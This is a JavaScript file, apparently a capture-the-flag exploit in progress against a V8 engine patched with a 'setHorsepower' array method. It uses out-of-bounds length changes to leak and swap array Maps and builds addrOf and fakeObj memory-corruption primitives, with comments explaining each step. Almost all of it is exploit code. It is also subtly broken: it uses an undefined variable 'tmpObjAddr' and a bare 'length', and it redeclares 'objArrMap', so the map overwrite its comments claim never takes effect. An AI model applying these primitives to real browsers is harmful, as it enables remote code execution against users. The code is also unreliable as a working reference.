
function leakMapAddress(arr) {
	let map_addr = arr.setHorsepower(arr.length + 1)
	arr.setHorsepower(arr.length)
	return map_addr
}

function setMapAddress(arr, val) {
	arr.setHorsepower(arr.length + 1)
	arr[length] = val
}

// addrOf:
// 	given an object, it returns its memory address as float
function addrOf(inObj) {
	let address
	let tmpObjArr = [{ "A": 1.1 }]
	let tmp = [1.1, 1.2]

	let floatMap = leakMapAddress(tmp)
	let objMap = leakMapAddress(inObj)

	tmpObjArr[0] = inObj
	// change maps
	setMapAddress(tmpObjArr, floatMap)
	// read
	address = tmpObjAddr[0]
	// change maps back back
	setMapAddress(tmpObjArr, objMap)

	return address
}

// fakeObj:
// 	given a memory address, return it as an object
function fakeObj(addr) {
	let memory_as_object

	let tmp = [1.1, 1.2]
	let tmpObjArr = [{ "A": 1.1 }]

	let floatMap = leakMapAddress(tmp)
	let objMap = leakMapAddress(tmpObjArr)

	tmp[0] = addr

	setMapAddress(tmp, objMap)
	memory_as_object = tmp[0]
	setMapAddress(tmp, floatMap)

	return memory_as_object
}

// create a float array, whats really important in it is its Map as it treats
// values at indexes i as floats. An array of objects (an array of objects with
// named properties) puts memory addresses at the various indexes
let floatArr = [1.1, 1.2]

// 100 is an arbitrary number to change the .length parameter
// we do this so that we can read at index 2 floatArr's Map address
floatArr.setHorsepower(100)

// it is interpreted as a float value, remembe to convert in hex notation before
// printing it
let floatArrMap = floatArr[2]

let obj = {"A": 1.1}
let objArr = [obj]

// same as before, we want to read objArr's Map and subsistute with floatArrMap
objArr.setHorsepower(100)
let objArrMap = objArr[1]

// overwrite the map. Now objArr instead of returning objects (by dereferencing
// memory addresses) will just return those memory addresses as float numbers.
// This effectively lets us read the memory address of any object we insert in
// objArr
let objArrMap = floatArrMap

// we successfully leaked objAddr address
let objAddr = objArr[0]

// now objArr treats its values as floats, which means we can simply write
// floats values as
//
// 	objArr[i] = myFloatValue
//
// Keep in mind that memory addresses are represente as float values


